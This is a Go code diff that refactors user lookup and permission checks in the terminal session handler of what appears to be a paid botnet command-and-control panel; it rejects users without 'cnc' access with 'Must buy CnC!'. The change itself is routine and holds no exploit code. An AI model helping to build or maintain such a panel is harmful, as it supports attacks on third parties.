@@ -1,7 +1,7 @@
 package net
 
 import (
-	"api/core/database"
+	"api/core/database/users"
 	"api/core/models"
 	"api/core/models/log"
 	"api/core/net/commands"
@@ -33,12 +33,12 @@ func (net *Admin) Handle() {
 		net.conn.Write([]byte("\033[?1049l"))
 	}()
 
-	userInfo, err := database.Container.GetUser(net.conn.User())
+	userInfo, err := users.Container.GetUser(net.conn.User())
 	if err != nil {
 		net.conn.Write([]byte(fmt.Sprintf("Error retrieving user info: %v", err)))
 		return
 	}
-	if !userInfo.HasPermission("cnc") && !userInfo.HasPermission("admin") {
+	if !users.HasPermission(userInfo, "cnc") && !users.HasPermission(userInfo, "admin") {
 		net.conn.Write([]byte(fmt.Sprint("Must buy CnC!\r\n")))
 		time.Sleep(5 * time.Second)
 		net.conn.Close()
@@ -62,7 +62,7 @@ func (net *Admin) Handle() {
 	sessions.Sessions[Session.ID] = Session
 	sessions.SessionMutex.Unlock()
 	var role string
-	if Session.User.HasPermission("admin") {
+	if users.HasPermission(Session.User, "admin") {
 		role = "admin"
 	} else {
 		role = "user"
